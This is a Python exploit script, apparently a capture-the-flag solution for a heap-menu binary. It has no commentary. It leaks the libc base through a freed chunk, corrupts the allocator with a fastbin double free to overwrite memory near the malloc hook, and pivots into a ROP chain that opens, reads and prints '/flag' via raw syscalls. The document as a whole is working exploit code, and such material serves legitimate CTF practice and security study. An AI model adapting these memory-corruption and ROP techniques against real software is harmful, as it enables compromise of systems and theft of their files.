#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

ru(b"egarots esreveR\n")
pop_rdi_ret = 0x0000000000400E53
pop_rbp_ret = 0x00000000004007D8
pop_rsi_2_ret = 0x0000000000400E51
leave_ret = 0x0000000000400954
getN = 0x400956
payload = flat(
    [
        pop_rdi_ret,
        0,
        pop_rsi_2_ret,
        0x602400,
        0,
        elf.sym.read,
        pop_rbp_ret,
        0x602400,
        leave_ret,
    ]
)
sl(payload)


def cmd(choice):
    ru(b">>eciohc ruoy\n")
    sl(i2b(choice))


def add(size, data):
    cmd(1)
    ru(b"?ezis\n")
    sl(i2b(size))
    ru(b"egarots esreveR\n")
    sl(data)


def show(idx):
    cmd(2)
    ru(b"?xedni\n")
    sl(i2b(idx))


def delet(idx):
    cmd(3)
    ru(b"?xedni\n")
    sl(i2b(idx))


add(0x100, b"7")
add(0x100, b"6")
delet(7)
show(7)
ru(b"?ereh\n")
libc_base = u64_ex(ru(b"\n", drop=True)) - 0x3C4B78
assert libc_base > 0
lg("libc_base", libc_base)

fake_fast = libc_base + 0x3C4AED

add(0x60, b"5")
add(0x60, b"4")
add(0x60, b"3")

delet(5)
delet(4)
delet(5)

add(0x60, p64(fake_fast))

add(0x60, b"a")
add(0x60, b"a")

add_rsp_38_ret = libc_base + 0x000000000012B98A

add(0x60, b"a" * 0x13 + p64(add_rsp_38_ret))
cmd(1)
ru(b"?ezis\n")
sl(i2b(10))

pop_rdx_ret = libc_base + 0x0000000000001B92

payload = flat(
    [
        0x602400,
        pop_rdx_ret,
        0x1000,
        elf.plt.read,
    ]
)
s(payload)

pop_rsi_ret = libc_base + 0x00000000000202F8
pop_rax_ret = libc_base + 0x000000000003A738
syscall_ret = libc_base + 0xBC3F5

payload = flat(
    {
        0x00: b"/flag\x00",
        0x20: [
            pop_rdi_ret,
            0,
            pop_rsi_ret,
            0x602400,
            pop_rdx_ret,
            0,
            pop_rax_ret,
            257,
            syscall_ret,
            pop_rdi_ret,
            3,
            pop_rdx_ret,
            0x100,
            pop_rax_ret,
            0,
            syscall_ret,
            pop_rdi_ret,
            1,
            pop_rax_ret,
            1,
            syscall_ret,
        ],
    }
)
debugB()
s(payload)

ia()

# 3abdd3b740284283954b25cbb29eeeb4
